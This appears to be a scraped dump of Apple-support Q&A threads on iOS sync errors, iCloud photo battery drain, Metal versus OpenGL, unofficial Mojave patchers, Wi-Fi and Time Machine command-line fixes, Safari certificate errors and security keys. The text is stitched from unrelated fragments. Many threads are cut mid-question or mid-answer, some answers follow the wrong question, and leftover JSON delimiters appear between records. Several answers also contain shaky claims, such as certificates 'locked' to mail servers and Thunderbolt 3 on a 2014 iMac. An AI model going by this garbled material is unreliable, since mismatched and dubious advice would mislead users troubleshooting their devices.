I similarly found the popup to be suspicious.\nIt seems Apple has some bugs in their MobileDeviceUpdater software that cause this message to pop up spuriously.\n\nA: This is happening to me with a MacBook Pro running High Sierra 10.13.6 and an iPhone X and iPad Pro running iOS 12.1. Apple support have told me that the solution is to upgrade to macOS Mojave, but I don't want to upgrade my entire OS at the moment. The error only occurs sporadically for me. Other people have reported that trying a different Lightning cable might work, or that the error only occurs when the phone is below a certain level of battery charge.\n\nA: The problem can be fixed by installing XCode beta.\nThis error occurs when the version of macOS (and iTunes) running on the computer is not compatible with the version of iOS on the device you're trying to connect.\nNormally, updating the macOS to its current version will solve the problem. However, this won't work if the iOS device is running a newer beta version, and the Mac is not.\nIf you don't want to run the beta version of macOS (or downgrade the iOS device to a non-beta version), a solution is to install the beta version of Xcode.\nEven though you may have no use for Xcode itself, its beta version includes the necessary software patches which will allow your existing macOS (and iTunes) to support devices running the iOS beta.\nDownload the Xcode beta from:\n  https://developer.apple.com/download\nThe xip file will (eventually) unarchive into the full Xcode app. Drag it into your Applications folder, and then be sure to start Xcode. At that point it will install the necessary software components for the latest iOS beta.

I'm running into issues with my battery draining quickly (iPhone 6s with iOS 11) and it appears that Photos is the culprit (based on % battery use) presumably from uploading photos to iCloud Photo Library (with ~150k items).\nI can manually 'Pause Updates' by going into Photos. Updates are also paused when in Low Power Mode — both of these are helpful. However, when I plug in the phone to charge and it gets back to 80%, Low Power Mode turns off and iCloud Photo Library updates resume, and my battery quickly drains again.\nIt could be that the battery just needs to be replaced. The capacity is above 80% and the iPhone reports that the batter is ok.\nIs there a way to to configure Photos to only update iCloud Photo Library when it is plugged in and not to update when it is on battery power?\n\nA: Source:\nPrevious versions of iOS would only sync photos when the device was plugged-in and on wifi.\niOS 11 changed that.  Now photos will also sync when on cellular and when not plugged-in.  This means if you have a lot of photos, the first-time sync could kill your battery.  \nThere's no fix for this however there is a workaround according to this Apple discussion.  This user had both an iPhone and iPad and used the iPad to do an upload of several images first.  After that they turned iCloud for their iPhone back on.  I can't vouch for this method because I never tried it but it worked for several people on that discussion thread.\n\nUse iTunes to sync a minimal number of photos which automatically turned off iCloud Photo > Library. After that finished on the iPad I turned on iCloud Photo Library and agreed to \n  delete the photos I'd just synced and then it worked.\n\n", "Q: Does Mac Pro 2013 support 5 GHz Wi-Fi?

I work with machine learning and 3D rendering, both of them need powerful GPU, and my laptop completely lacks it.

Another opinion is dropping opengl/cl support has nothing to do with performance or stability or engineering effort and purely about is profit. Pure and simple greed explains*\"\n\nWhat you wrote here is a decent synopsis with the information you been reading by others in general as it's trendy and popular to hate everything Apple does without gathering any real research/evidence. You are missing very important details that dismiss almost everything you claimed as it was formulated by a collection of misinformation from people parroting unfounded conclusions based off of other parroters.\n\n\n*\n\n*The older Macbook's are too old: This is actually completely correct, Apple has rewritten most/all of the GUI, The Quartz 3D Compositor and CoreAnimation in Metal (Basically the whole desktop is now accelerated by Metal and this will only grow in time). Currently older Macbooks with the Intel iGPU don't support the Metal API as they can't even use all the basic Metal API calls in release V1.0. Currently High Sierra does ship with both the old OpenGL Quartz compositor and the new Metal V2 Compositors. \nYou can instantly see what kind of mess they would be in if they kept both 3D API's around (incompatibilities across all the new advanced features, further upkeep of all the Frameworks that now have to be written twice for each API = Equals more bugs, greater power draw and less stability by means of hardware variation compliance).\n\n*Metal to OpenGL wrapper: First of all these components of OSX are not open source so this would never get anywhere and 2nd this is a terrible idea as you're taking an API that directly communicates to the GPU with custom written functions, then would be no possible way a high level API like OpenGL could pass that info directly onto the GPU (that's not how these older API's function). Also since no one is relying on OpenGL anymore it's going to fizzle and rot since Khronos works on the Vulkan API now, they are never going to advance OpenGL anymore, hence it's a bad decision to stay on that API.\n\n*\"MeTooGFXLibrary\" If you researched these low level API's you would find out that Apple's Metal API came around before Vulkan and D3D12. So in this instance \"MeTooGFXLibrary\" camp would refer to  both Vulkan and M$ D3D12 for playing \"The Me too\" card by following and copying Apple's new direction in 3D tech*. (In fact, Apple had the Metal API completed and released in devices to the public 1 whole year before Vulkan was even announced. By the time Vulkan was ready to release and be used in games, Apple had already rewrote most of the graphics layers in OSX with Metal acceleration being used in OSX Sierra.\n*This blurb focused on the Personal Computer low level API race, in reality it was Sony with their \"LibGCM\" low level API, included in the PS3 dev kits which had almost all game developers shocked at how much more control, freedom and performance it delivered which made most everything else useless. This event here kick started the movement of this type of API to the Desktop world.\n\n\n*\"DO have the capability to render \"dark\" mode on anything\" Yep they certainly can, but this is not the main feature or the motivator.\n\n*\"dropping opengl/cl support has nothing to do with performance or stability or engineering effort and purely about is profit.\"\nBy now I hope anyone reading this has comprehended that I already demonstrated multiple times on how dropping OpenGL will, without a doubt increase performance by a very large margin across all graphical frameworks, and at the very least hold onto their current stability profile. \nBeyond the scope of this response to list the entire list of components that rely on Metal, Most people have came to a realization on just how big the upkeep of an API is and just how many other OS Frameworks rely on it to function. It's hooked into most everything you're interacting with, from drawing 2D animations, Anti-Aliasing fonts, drawing transparencies, accelerating video rendering, applying video effects, rendering shapes and layers, heavy mathematical calculations, video compression, allowing your web browser to accelerate rendering it's own canvas... \nit's basically everywhere and to keep and use the weak performing/obsolete OpenGL around and manage a massive separate code base for an OpenGL equivalent of everything your OS is accelerating with no support for any of the advanced acceleration additions the keep getting added on the Metal side of things.\nNo user would rather weak performance and less features, then find out that most 3rd party programs they love and use start to refuse to include OpenGL acceleration due to economics, people stuck on that old hardware will have difficulty just getting around the internet and loading up google maps by that point...\nAlthough I believe these decision were motivated by greed/dev lock-in:\nApple's deprecation of OpenCL and reluctance to adopt the Vulkan API. \n\nA: A utility was created by some person called \"dosdude1\" that downloads a copy of Mojave's installer from apple (Sierra and HSierra versions available), burns the image to a usb thumb, and applies patches into it so that it's bootable on unsupported Macs. any Mac with a penryn CPU is compatible (SSE4.1). since yours is 2010 MacBook therefore it can run Mojave just fine. make sure that you properly read his documentation before attempting to do anything so that you don't waste time being in a cycle of confusion. As for metal rendering. if your Mac does not support metal (clearly). OpenGL still exists in Mojave and you can still use it to render everything through drivers that were possibly copied over from a High Sierra installation: https://www.youtube.com/watch?v=5uyYVCiYFuE\nCatalina 10.15.x : http://dosdude1.com/catalina/\nMojave 10.14.x :   http://dosdude1.com/mojave/\nH Sierra 10.13.6 : http://dosdude1.com/highsierra/\nSierra 10.12.6 :   http://dosdude1.com/sierrapatch.html/\n\n\nA: macOS Mojave requires Metal support. Apple is justified to prevent installation on older models because they literally do not have the capability to render the GUI.\n\nEdit: A recent upvote has reminded me about this answer. I'm appending this section to say that an inability to run Mojave is not entirely the case. Mojave still has software rendering for Recovery Mode. AnyOS'll Do's answer is not entirely wrong, despite most of the answer being assumptive.\nThis answer links to a tool already in existence (that has been brought to my attention before, although I didn't think much of it) to enable installation of Mojave on unsupported Macs. The only catch is that hardware acceleration will be disabled, since hardware acceleration for old GPUs has been dropped.\n\nA: Parallels does exactly what I want. So I created a minimum host and now run everything in parallels vm. SSD makes it quick and the calls from metal to OPENGL! are performed by parallels directly. So it can be done and runs absolutely smooth with large gaming support.\n\nA: \nliterally do not have the capability to render the GUI\n\n\"That is until some genius on github decides to create an opengl wrapper that interrupts metal calls.

I hope you can appreciate that ageing is a natural part of life, we don't deprecate that, do we?\nIt may then come as no surprise to some that a person like me could be passionate enough to care about not just my hardware, but the hardware of others. It's what I do, I am good at it. Also, the environment is really the biggest factor here if we must go down the rabbit hole.\nApple are the leaders of where I considered the direction of the operating system to go moving into the future. I am back peddling on this. I am an avid traveller of OS's and, if I were to hate on anything, then it would be the abominations that are Windows 8 through 10.\nThis need for all operating systems to look samey same (I am looking at you ubuntu) is just off-putting. As for my personal opinion piece above? Pure anecdotal, I own a MBP2011 and can not afford a new one at this time, so there's that. I am turning away from Apple once support for high sierra drops and will go the route of a *nix flavour of the month I wish to try. Staying at the forefront is always the best option for me, rather than to stagnate on an os on this device. I have been burnt by Apples ios 32bit to 64bit deprecation which removed +70% of my \"paid\"(i.e. not freemium crap) gaming library, because I am the sucker who likes to own things and stay updated, can't go back when one adopts too early.\nTo answer you about trends? I make my own, thank you. I am smart enough and ugly enough to not be herded by your mentality on such matters. I admit I jumped the gun, but I have a passionate reason to, anecdotally. My opinion may coincide with others, but I am sure the devs of MAME and WINE were under fire from all hurdle turtles jumping up and down all donkey kong like when they were trying to stand on the shoulders of the platforms they were opening up for others at the very beginning.

A couple of years ago I bought a used macbook pro from a friend of mine, I knew it was a good deal cause the mbp was modified and had very good response and performance, the specs of this mbp are the following (although its in spanish you will get it):\n\n\n\nI love this macbook, firstly cause its 15 inch and I prefer big laptops, secondly cause the performance its good, from a normal web and email browsing session, up to a large xcode programming workspace or a whole 30 min final cut pro video edition.\nIn the other hand I recently bought a band new 21.5 inch iMac which also seemed like a good deal, my logic in that moment was that if my 2009 second-hand mbp (2.8 GHz core duo) had excellent performance, a 2014 retina iMac (3GHz Intel core i5) would be up to three times faster than my laptop. iMac specs:\n\n\n\nThis iMac its always laggy and opening any app takes soooo much time. It constantly freezes and I cant think about having more than 3 apps at the same time, that would be useless.\nI dont know exactly what customization the MBP had, guess it was a RAM and video card upgrade next to the 250GB SSD. \nMy question is, whats the problem with the iMac and what can I do to achieve the same (or better) performance that the mbp?\nThe SSD is the main difference?\n\nA: Yes, the SSD is the main difference.\nYour iMac has a 1TB 5400rpm SATA Hard Drive and this is what’s causing the bottleneck. The MacBook Pro, on the other hand, has a solid state drive that is multiple times faster. So, while the iMac may actually process things faster, loading apps and reading/writing data will be a lot slower. And, if it needs to use hard drive space when it needs more RAM, this will also significantly slow things down.\nAchieving the same/better performance\nSince your iMac has two Thunderbolt 3 (USB-C) ports that support speeds up to 40 Gbps (via Thunderbolt) and 10 Gbps (via USB 3.1 Gen 2), the easiest solution is to use an external SSD that’s connected via one of these ports and to install macOS instead. You would then use that drive as your main boot volume. \nHowever, you would need to ensure that:\n\n\n*\n\n*it’s definitely an external SSD (and not just a hard drive)\n\n*it supports either Thunderbolt or USB-C (i.e. USB 3.1) as its interface\n\n\nBoth of the above are critical if you’re wanting to improve speed. Thunderbolt models are still quite expensive, but you'll find USB-C / USB 3.1 models at reasonable prices.\nNOTE:  Do not get confused by USB 3 - this is not the same as USB 3.1. And remember, it needs to connect to one of the two Thunderbolt ports (not one of the USB ports).\nSome examples of the types of external drives I mean are:\n\n\n*\n\n*Samsung T5\n\n*SanDisk Extreme 510\n\n*G-Technology G-DRIVE mobile SSD\nOnce you have the drive you want, you will need to install macOS onto it and migrate your data. \n\nA: It's not going to work\nAvg speed most of SSDs today have -- is around 400-500Mbps\nWhen you plug such SSD external into USB-C of modern iMac, you will most likely have full speed its capable of -- 400/500Mbps. \nBut it's absolutely insufficient to work with iMac 27\" 5K, for instance.\nInternal Fusion Drive is measuring 800/1100 Mbps, and it's still kinda laggy.\nSo... \nNo luck.\nThe only option you may have is to install proper SSD INSIDE of the Mac.\n", "Q: Problems copying content in Safari Developer Mode When using Safari Developer Mode, I've encountered two oddities:\n\n\n*\n\n*\"Search\" tab: Enter a search, click search result (left), then mark text in source viewer (middle), then click Ctrl+C (or right-click and select Copy). Result : Entire source is copied.\n\n*\"Elements\" tab: Highlight link: Right-click and select \"Copy Link Address\". Result: Nothing is copied.\n\n\nAm I using it wrong, or are these in fact bugs in Safari?\n\nA: Safari Technology Preview 61 fixes one of the issues. Per the release notes:\n\nWeb Inspector\n\n*\n\n*Fixed copy from Search results content view\n\n\n\nThese would appear to be bugs in Safari, I can reproduce them in Safari Technology Preview 58. You can report bugs to Apple by following the steps at developer.apple.com/bug-reporting.\n", "Q: Problem unlocking Mac using Touch ID I got a problem with using the Touch ID to unlock my MacBook Pro 15\" running macOS High Sierra. Whenever I lock my screen by clicking the  → Lock Screen (or Control + Command + q), Mac locks me out and shows me a password window.\n\nI cannot use Touch ID to unlock it, I have to click the Switch User button, then go to the normal Login screen, and then I can use Touch ID to unlock it.\n\nBut my colleague, sees the normal Login screen always when he locks the screen on his MacBook.\nDoes anyone know how to resolve this issue?\n\nA: I managed to fix my issue regarding the Lock Screen.\nI have OpenSC and mPollux Digisign clients installed on my MacBook Pro.\nOpenSC was installed for logging into macOS with Smart Card and mPollux was installed for ID authentication.\nI uninstalled both of them. Now when I lock the screen, I have the normal Lock Screen back, and can use Touch ID to unlock it. But I don't know which application affected it.\n\n", "Q: Command Line (CLI) Command for disconnecting wifi from current network I'm looking for a way to disconnect from my current WIFI network via CLI. There is a way to do that, but it's a GUI way.\nAny ideas how to accomplish that?\nThanks!\n\nNote:  I don't want to disable Wi-Fi because I need Airdrop to be function so I just want to disconnect it from the existing network.\nEDIT: Why do I want this?\nAt work we connect out MBPs to Displays w/ ethernet attached. Also we heavily use AirDrop functionality. The aim is to write a script, that automatically disconnects from WIFI networks, when ethernet cable is plugged in, so that we can still use other WIFI features like AirDrop & Apple Watch unlocking. \n\nA: Use networksetup.\nThere are several ways to disconnect from a Wi-Fi network via Terminal:\n\n*\n\n*Disable the Wi-Fi service.  This will require root privileges.  The radio will remain on, but it won't connect to anything.\n$ sudo networksetup -setnetworkserviceenabled Wi-Fi off\n\n\n*Turn off the airport power (this is like clicking the (GUI) Wi-Fi icon and selecting \"turn off Wi-Fi\".  You don't need sudo and you should know which interface (en0, en1, etc.) is your Airport adapter.  If you don't try the service and macOS will attempt to guess which one it is.\n$ networksetup -setairportpower Wi-Fi off\nIn the specific case where you don't want auto join, just set the network to not auto join and then toggle the network status using networksetup.\nIf you just want to disconnect from a WiFi network, disable the adapter:\n$ sudo networksetup -setnetworkserviceenabled Wi-Fi off && sleep 15 && sudo networksetup -setnetworkserviceenabled Wi-Fi on\n(You can issue the command without sudo but you will get a popup prompting you for a password for each networksetup invocation)\n\nA: You can use this one (found on the internet and tried myself):\nInstead of \"DEVICE_NAME\" use your interface (i.g.: en0)\nsudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport \"DEVICE_NAME\" -z\n\n", "Q: MacBook Pro 15\" 2017 runs hot while sleeping & closed lit This problem happens

A side effect of that migration was that my main drive was renamed from “Macintosh HD” to “OWC Aura SSD.”  Two months ago, I upgraded operating systems (which took a lot of work because of the third-party internal SSD), and managed to get the main drive renamed back to “Macintosh HD.”\nNow I notice that when I changed the name of the drive, the name of the snapshot volumes changed as well.  So I have in my Time Machine file system /Volumes/Time Machine/Backups.backupdb/My MBP/2017-09-26-102523/Macintosh HD, but the next one is /Volumes/Time Machine/Backups.backupdb/My MBP/2017-10-23-131237/OWC Aura SSD.\nMy latest snapshot is April 6, and contains a OWC Aura SSD volume, but now my drive is called “Macintosh HD” again.  Time Machine is failing to back up, and complaining about the TM drive not having enough space. I'm gathering that's because it wants to do a full backup on what it thinks is a new drive.\nThrough some research and the tmutil man page, I think that I should use a command such as\n# sudo tmutil associatedisk -a \"/Volumes/Macintosh HD\" \"/Volumes/Time Machine/Backups.backupdb/My MBP/Latest/OWC Aura SSD\"\n\nThat should tell Time Machine that the current “Macintosh HD” is essentially the same drive as the Latest/April 6 “OWC Aura SSD”.  Please correct me if I have that wrong.\nBut my main question is: Is there any way to go further back and stitch together the changes between 2017-09-26 and 2017-10-23?\n\nA: After I posted this question, I thought of a possible solution.  And it turned out to be the right one.  It's the same command!\nAfter running\n# sudo tmutil associatedisk -a \"/Volumes/Macintosh HD\" \"/Volumes/Time Machine/Backups.backupdb/My MBP/Latest/OWC Aura SSD\"\n\nI did the same thing with the old Macintosh HD backups:\n# sudo tmutil associatedisk -a \"/Volumes/Macintosh HD\" \"/Volumes/Time Machine/Backups.backupdb/My MBP/2017-09-26-102523/Macintosh HD\"\n\nThe -a flag is important because it associates all backups with the same disk identity in the same way.\nThe result is that all the backups on my Time Machine Drive are associated with my MacBook Pro, and that's just how I wanted it.  Once I ran these commands, Time Machine was able to delete the oldest backups and do a new one.\n\nA: My case is similar, I bought a new MacBook and I want it to inherit Time Machine Backup history from my old Mac.\nI found this post about the problem.\nIt mention two types of Time Machine reconnections: inheritance and volume association.\nIn my case, I think inheritance is the best option.\nThe command line mentioned is:\nsudo tmutil inheritbackup <Old Mac Time Machine Volume Folder>\n\nHope it helps!\n", "Q: Is there a shell script to send notifications on mail events? I've never written an apple script before so I am wondering if there's a way to write a script that continuously (maybe at intervals of 10 minutes) checks my inbox and sends a notification on my mac if there's a new email in inbox (microsoft exchange).

Go to System Preferences > Notifications and scroll down the list of apps on the left and select Mail. Select the Alerts Mail alert style for the simplest notification. The Badge app icon option just puts an badge on the Mail app icon in the Dock and the badge increments the total number of new emails as they arrive.

Also the Internet connection seems to be established because I can ping websites and use curl when I'm connected.

Click the DNS tab and remove any entries in the left pane)\n\nIf you don't have any antivirus, VPN or firewall programs installed, then it has to do with the website. Their network encryption is weak and Apple wont let you use it. Which usually notes a certificate issue. Normally the site admin stays on top of this.\n\nIf Safari says it can't establish a secure connection, or the website\n  is using weak encryption\nTo protect your security and privacy, websites must use strong\n  encryption to provide a secure web connection.\nSecurity enhancements in OS X Yosemite v10.10.4 and iOS 8.4 help\n  protect against important security vulnerabilities. If a webpage is on\n  a server that doesn't meet secure cryptographic standards:\n  \n  \n*\n  \n*Safari will say that it will not open the website because it's using    weak encryption.\n  \n*Or Safari will say that it can't open the page because Safari can't    establish a secure connection to the server. To resolve the issue, the website administrator should configure their server to be secure.\n  \n\n\nHow to Correct Certificates\nIf you only experience the error in Safari but not in other browsers, then open the blocked websites in another browser. Once you have it open, just next to the URL you will identify a tiny green lock, the word secure may be beside it. Click on it and it should show you a certificate option which shows you the current certificate details for that site.\nYou may see a label name that identifies the certificate. Some say Verisign or Digicert. The naming doesnt matter but you need to find it in your keychain.\nOpen up Keychain Access either with Spotlight Search (keyboard shortcut - CMD + Space Bar) or you can go to your LaunchPad (or Applications in Finder) and look for a utilities folder. It has Keychain Access in there.\nWith Keychain access open, click on system roots for all entries. You will find here your certificate by name and it will have a blue cross marked on it. Double click it and another window will come up. You have the option of choosing system setting, always approve or always reject.\nYou will realize that the certificate was the problem all along. Usually, a certificate will be locked on to the mail server and it will prevent any other website from using it. (Your mail server should be the entry starting with the “smtp” prefix and ending with a “.dk” suffix. Why the certificate would be locked to the mail server is as good as anyone’s guess.\nChange the authentication of the certificate to “System setting”\n\nIf none of this works, and you have no problems with other networks, then you need to contact the network admin and have them reset the router by powering it down, pulling out the plug for a few mins and then plug it back in and restart it.\nIf they have reset it and the issue still occurs, then there are some files either missing or corrupt with MacOS. I'd attempt a MacOS reinstallation (make sure you do a backup 1st) and see if things are different from there.\n", "Q: After updating to macOS 10.13.5 it asked for iCloud account and password I Update To Mac Os 10.13.5 From High Sierra After Updating MacBook it again ask for icloud password and id is it normal?\n\nA: Yes, that’s normal behaviour for a MacOS upgrade. \n", "Q: After Updating Mac to 10.13.5 Guest User Account Appeared?

It blocks anything that mentions men's/women's health and even websites crucial to my university's student life. (And no, I can't just white-list them because they all have different domain trees & it blocks the brief login page that occurs before I complete said login).\nI've also looked at apps such as Zero Willpower, but these seem to only work with safari. (I use chrome).\nIs there any way to allow access to all websites and only block one? (Perhaps a way to white-list all websites under the \"adult content\" banner and then blacklist the target site).\n\nA: There is a way, but it needs some technical skills and some money. Get yourself a private server, set up a VPN server on it, and block the IP address for the website from being accessed through the VPN. Then use Apple Configurator to turn your phone into a managed device and force it to use your private VPN at all times. \n\nA: You could use an app that creates a VPN-Network only on your local device. An app which can do this and I can recommend is AdGuard Pro (https://adguard.com/en/adguard-ios-pro/overview.html). With this app you can block a particular website or whole list of websites entirely.\n\nA: Many content blockers for Safari have this feature. I use 1Blocker Legacy which is entirely free (gratis) and lets you write custom rules under \"Block URLs\". You can turn off all the other block sets it provides.

I used Anaconda to install both python 2.7.15 and python 3.6.5. I created virtual environments for both of these.  I'm trying to learn python and I'm using Visual Studio Code. I've run scripts fine that were developed for python 3 but the code I'm currently working with was developed for python 2. I can not get VScode to run using a python 2 interpreter, it seems to use python 3 no matter what I do. I could rewrite the script to make it compatible with python 3 but I'd rather not do that. I've tried running VScode from the python 2 virtual environment but that seems to have no effect. I edited the settings in VScode and changed the variable python.pythonPath to point to python 2 but that doesn't work. I used the command pallet to change the python interpreter but that doesn't work either. How do I force VScode to run python 2. \n\nA: Start VScode and open your python script. Using either the command palette or the status bar, select the python interpreter you wish to use. Both options present a list of available interpreters. Now you may run your code by right-clicking in the edit window and selecting \"Run python file in terminal\". A terminal window opens below the edit window and your code executes there. Note: You must execute your code using the right-click technique described above. Other methods, such as using the command palette with \"run: code\", will not work\n", "Q: Keyboard shortcut to move tabs left or right? Is there a Safari keyboard shortcut to move a tab?\nIf not, how can I make one?\nI wouldn't even know how to write an AppleScript for this, the only method I see of moving tabs is to drag them.\n\nA: Here are two AppleScripts for moving tabs one position right or left. The AppleScript gets the current tab index, checks if it can be moved, then moves it and ensures it's still active.

Returning and turning off Advanced protection. \n", "Q: How do I use a U2F token when adding a Google account to my Macbook Pro I'm enrolled in Google's Advanced Protection Program, which means I can only authenticate with a physical FIDO U2F token on every sign-in.\nTrouble is, that when I try using my Google account, I see \"You can only use your Security Keys with Google Chrome\".\n\nIs there a way around this, or a way for me to use my U2F security key here?\n\nA: There isn't a way to use your U2F token in this scenario.  U2F depends on browser support, and as of August 2018, only Chrome, Firefox and Opera support it.\nAs a workaround, you could set up Google Authenticator and use that to log in.  \n\nA: I looked into the issue you described and I saw on Google's Advanced Protection Program Page, and read that \n\nApple’s Mail, Calendar, and Contacts apps will continue to be able to access your Google data as normal.\n\n\nSo, that means you should be able to use your U2F key on that application. I would contact Google or just turn off advanced protection program, then re-activate it.\nAlso, make sure you are on the latest version of MacOS (which is High Sierra 10.13.6 or Mojave 10.14) because that could be the reason why it is not working.\nI hope this answer helps\n\nA: This is now possible as of macOS Catalina 10.15.2, as Safari has gained support for security keys. When signing in to your Google account in the Internet Accounts preference pane, Safari will prompt you to touch your USB security key after you enter your Google account password, and will then prompt you to allow macOS access to your Google account.\n\nA: Google seems to think they have a solution (though it's not directly linked to the Advanced Protection Common Questions, and doesn't help in the case of Advanced Protection ) - because App Passwords are not available to Advanced Protection users. \nAll other articles about \"Trusted Devices\", etc. lead you down a rabbit whole of loops to \"Checking Your Security Settings\".\n\n\n", "Q: Unable to access web through VPN I've had VPN setup on my OS X Server forever, but I've only used it for remote access to manage the server itself, never as a pass through to the internet at large. It occurred to me that when I travel it might be useful to have my communications routed through my server, so I've tried setting it up to do so and I'm not able to get it to work.\n\n\n*\n\n*I've switched on \"route all communications through VPN\" in the client\nsettings. \n\n*I don't have any routes defined in the VPN settings of Server. \n\n*My server acts as a DNS server already so my VPN settings point to it\nas the first DNS server.  \n\n*I have a public DNS server listed as the second.\nWhen I connect to the VPN and try to get to a web page, no luck-- Safari just times out. \nI can \"host google.com\" successfully from the terminal and if I use an IP address in the Safari location bar, I still can't connect. So I don't think the problem is DNS.\nI can get to the web when logged in locally to the server, so I think the port is open.\nI had experimented with IceFloor a few years ago, but have since removed it-- I'm not entirely sure where to look for remnants of it but I don't see any files for it floating around and I don't see pf in the process list.\nAny other ideas?\n\nA: I think we could use some more detail about your VPN, I'm guessing it's openvpn?\nFrom memory you should allow 'route all comms' in the server settings and create a default route from your vpn-client subnet to the server's gateway or exit nic. You'll also want to make sure firewall settings allow traffic between the IPs & ports you want.\nFinally, check what can ping what else to determine the point of the problem. Check if your client can ping the server's internal VPN IP address, its external interface while traffic is routed through the VPN, then its default gateway. If that doesn't highlight the problem and you can ping the external gateway while traffic is routed through the vpn (use traceroute to confirm the path) check if the server can actually reach the external hosts you're attempting to connect to.\n", "Q: Hold down and release right-click with a single click Essentially, what I want to do is:\n\n\n*\n\n*Upon clicking the right mouse button, simulate holding down the right mouse button.\n\n*Upon clicking the right mouse button once again, simulate releasing the right mouse button.\n\n\nUse case: I'm playing an old first-person shooter with a Magic Mouse 2, so I can't aim and shoot at the same time.\n\nA: This can be done using ControllerMate.

Please don't say iTunes.  I've owned countless iPods (including the original) and iPhones (including the original) and iTunes has never been a reliable means for getting content on to an iOS device.\nI basically have a bunch of mp3s (~4,000) that I listen to on my desktop & my iOS device.  I regularly run into the \"dotted circle\" issue, resulting in only some of my music being transferred.\nI've searched & tried the various tricks on Stack Exchange, as well as elsewhere on line.  \nSpecifically:\n\n\n*\n\n*I've reset my device but this is not practical to do on a regular basis and it hasn't worked.  It results in a different, random subset of my songs being transferred. \n\n*I've tried removing all my music & resyncing.  This doesn't work.  It results in a different, random subset of my songs being transferred. \nAt this point, I want to give up on iTunes.\nI just want something to get my music on my iOS device & enable me to listen to it.  \nI'm not interested in cloud services, despite Apple's push.  I already own most of the music I want to listen to & I'm not into new music.  I already paid for the music I have.  It seems silly to now \"rent\" it.\nI'm fine with not fancy.  I have no need to for fanciness.  I don't care about machine learning, auto playlists, content discovery.  \nAgain, I just want to transfer & listen to my music.\nI'm totally fine if this is requires new apps.

The action is called \"Pin/Unpin Focused Window to Float on Top\"\nIt works with most windows, but not with DRMed video content like Netflix.

This utility can then change it for me.\nSometimes (like right now) I want to throw this computer off the roof because it refuses to believe it supports 4k@60Hz.\nThis is independent of OS-X version, independent of TV (this same issue happened with a TCL TV), and independent of cable (happened with a different brand of cable).\nI tried some system-preferences extension which required me to turn off SIP to manually add custom modes, and that sometimes worked - but also sometimes caused the HDMI audio to not work, so I got rid of that.\nHow do I convince OS X that the monitor does and always will support 4k @ 60Hz?\nIn case it matters, I also have (on a different USB-C port) a USB-C/TB3 hub and its display-port output goes to the MDP-to-dual-link-dvi-adatper to a 30\" Cinema Display, so I have the 4k@60Hz TV, the 30\" Cinema Display, and the laptops display all acting as non-mirrored monitors.\nThis is the [active] cable I’m using:  https://www.amazon.com/dp/B075V5JK36/ref=cm_sw_r_cp_api_i_3g9hBbY6VM4X5\n\nA: I have the same problem, but with a MacBook 13\" 2017, a Samsung 4K TV, and a USB-C to HDMI 2.0 active cable.\nHow to solve the problem:\nFirst connect the USB-C end of the cable to the MacBook, then after a couple of seconds connect the HDMI end to the TV while powered on. I got 100% success in having 4K @ 60hz using this procedure.\nHow is this possible:\nNot too technical, but... The active chip on the cable's HDMI end first powers up and initializes from connecting it to the USB-C port, and in sequence, the correct resolutions and refresh rates are offered as soon as the other end of the cable is connected to the TV.\nI know this is not a proper solution, but at least it doesn't make me want to throw the MacBook out of the window!\nI hope there's some more feedback from other users.\n", "Q: How to switch the subtitle language of Hulu on Apple TV I began watching a show on Hulu. It came up with Spanish subtitles. I want to switch it to English subtitles.\nI was instructed by a Hulu customer service rep to go to the Hulu website, log in, pull up the show, start playing it, hover the mouse until the control bar appeared near the bottom of the screen, click the gear, select English from the closed captions options, and then log out on the web site which would set it as a global default. I did this, and it did make the show, as seen on my browser, use English subtitles, but this did not affect the same show as seen on Apple TV. However, if I start watching a new show, the subtitles are in English. It's as though Hulu has \"committed\" me to watching The Handmaid's Tale with Spanish subtitles, and won't allow it to be changed. \nThe customer service rep said this was a \"known problem with Apple TV\" and that I'd have to wait for Apple to fix it. I'm dubious. \nDoes anyone have experience with the Hulu app on Apple TV, and can suggest how to force a subtitle language change on a series I've already begun watching?\n\nA: So i was having the same problem and stumbled on the solution.  While watching the video hit the pause button on the Apple TV controller.  then swipe down.  A menu bar should appear at the top of the paused video Info  Subtitles Audio  When you hover over subtitles you will see it defaulted to Spanish.  Just switch to English.  Wow, so simple but took me forever to accidentally swipe down after pausing and then the menu appeared.  Good luck.\n", "Q: Find out which app is using Bluetooth device I noticed that my MacBook is connected to my Kevo bluetooth lock.  This lock is supposed to connect with an iOS app, but there is no macOS app that I'm aware of, and I have never told my computer to pair with it.  I want to figure out why it's connected to my laptop and what data has been exchanged.  I tried log show --last 24h | grep Kevo but that shows nothing.  That's interesting, since there are lines in the log mentioning my trackpad by name every time it connects.  I'm just updated to High Sierra 10.13.5, and I never noticed this happening before on Sierra.\nEdit:  After disconnecting the Kevo in the dropdown menu, it disappeared, so I am no longer able to reconnect to it.\n\n\nA: Sometimes your iCloud account will share Bluetooth authentications across iOS and macOS devices for easier pairing. Take for instance AirPods will automatically show up in your Mac after you've paired them with your iPhone. You used to be able to turn this off in the iCloud settings -> Documents and Data option.\n", "Q: Why mbp keyboard light stays on while playing video in fullscreen? I noticed macbook pro keyboard light stays on while playing video in fullscreen, on youtube and vlc. Wouldn't be better if apple auto turn it off (since I'm not using keyboard while watching movies)?\nI'm using latest macOS on mbp 15 retina.\nKeyboard light works normally in other situations, if I stop typing for a while it goes off.\n\nA: YouTube is a web-based video platform and VLC is a 3rd party program. These are not Apple-made applications and so may not be built specifically for the hardware you are using.\nYou can control the MacBook Pro keyboard lighting on your F5 and F6 keys for these 3rd party applications.\n", "Q: What are the short-cuts to click buttons on a MacOS message box? \nOn Windows you can use the TAB key to switch between which button has focus then press space to click the focused button.\nHowever, on MacOS, when presented with the dialog in this screenshot, I cannot seem to use tab to switch between the buttons I want to click. I can only hit RETURN to click the Save button, or ESC to click Cancel. But I have no idea how I can click the \"Don't Save\" button using just the keyboard.\nHow can I navigate/click buttons in a MacOS message box using just the keyboard (not the TouchBar, Mouse or TrackPad)?\n\nA: Actually, you can achieve the same behaviour in macOS!\nFirst, you need to do as follows:\n\n\n*\n\n*Go to Apple > System Preferences > Keyboard\n\n*Select the Shortcuts tab\n\n*Tick the All Controls radio button (see below)\n\n\n\n\n\n*Now exit System Preferences\n\n\nOnce you've done this, you can use the Tab key to navigate the various options (incl. buttons) in Dialog boxes. In the screenshot below I've selected the Don't Save button.\n\nOnce selected, just press the space bar as you would in Windows!\n\nA: It used to be that in the message box you show, the return key saves, the esc key cancels, and ⌘-d does the \"Don't Save\".\nHowever, this is apparently not universal, and may not apply in every box you get. Try it and see.\n\nA: You ca enable Mouse Keys in the Accessibility options and use the keyboard to move the mouse pointer around.\nOr you can enable full keyboard access to all controls in System 